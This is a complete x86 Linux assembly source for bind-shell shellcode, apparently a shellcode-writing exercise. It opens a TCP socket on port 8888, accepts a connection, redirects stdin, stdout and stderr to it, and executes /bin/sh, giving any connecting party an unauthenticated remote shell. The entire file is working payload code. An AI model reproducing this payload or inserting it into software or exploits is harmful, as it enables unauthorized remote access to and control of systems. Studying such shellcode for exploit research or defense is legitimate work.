; Shell Bind TCP

global _start

_start:

	; clean registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; socket syscall
	; socket(AF_INET, SOCK_STREAM, 0);
	mov al, 102			; socketcall
	mov bl, 1			; SYS_SOCKET
	push ecx	 		; 0 protocol
	push ebx			; SOCK_STREAM
	push 2				; AF_INET
	mov ecx, esp		; stack contains our 3 arguments
	int 0x80			; syscall
	mov edi, eax 		; store the socket in edi

	; bind_addr.sin_family = AF_INET;
  ; bind_addr.sin_addr.s_addr = INADDR_ANY;
  ; bind_addr.sin_port = htons(8888);
	push edx			; INADDR_ANY
	push word 0xb822	; listen on port 8888
	push word 2			; AF_INET
	mov ecx, esp		; stack contain our 3 arguments

	; bind syscall
	; bind(sock, (struct sockaddr *) &bind_addr, sizeof(bind_addr));
	mov al, 102			; socketcall
	mov bl, 2			; SYS_BIND
	push 0x10			; size of struct
	push ecx 			; push ecx to the stack which contains bind_addr struct
	push edi			; push the socket
	mov ecx, esp		; stack contains our 3 arguments
	int 0x80			; syscall

	; listen syscall
	; listen(sock, 0);
	mov al, 102			; socketcall
	mov bl, 4			; SYS_LISTEN
	push edx			; push 0
	push edi			; push the socket
	mov ecx, esp		; stack contains our 2 arguments
	int 0x80			; syscall

	; accept syscall
	; int opensock = accept(sock, NULL, NULL);
	mov al, 102			; socketcall
	mov bl, 5			; SYS_ACCEPT
	push edx			; push null
	push edx			; push null
	push edi			; push the socket
	mov ecx, esp		; stack contains our 3 arguments
	int 0x80			; syscall
	mov ebx, eax		; save return value opensock

	; dup2 stdin syscall
	; dup2(opensock, 0);
	xor ecx, ecx 		; clean ecx
	mov al, 63			; dup2
	; we don't push 0, since ecx is already NULL from the xor
	push ebx			; first argument: opensock
	int 0x80			; syscall

	; dup2 stdout syscall
	; dup2(opensock, 1);
	mov al, 63			; dup2
	mov cl, 1			; stdout
	push ebx			; first argument: opensock
	int 0x80			; syscall

	; dup2 stderr syscall
	; dup2(opensock, 2);
	mov al, 63			; dup2
	mov cl, 2			; stderr
	push ebx			; first argument: opensock
	int 0x80			; syscall

	; execve syscall
	; execve("/bin/sh", NULL, NULL);
	xor eax, eax		; clean registers
	push eax			; push eax to the top of the stack
	push 0x68732f2f		; push 8 bytes //bin/sh
	push 0x6e69622f
	mov ebx, esp		; //bin/sh in ebx
	mov ecx, eax		; null in ecx
	mov edx, eax		; null in edx
	mov al, 11			; execve
	int 0x80			; syscall
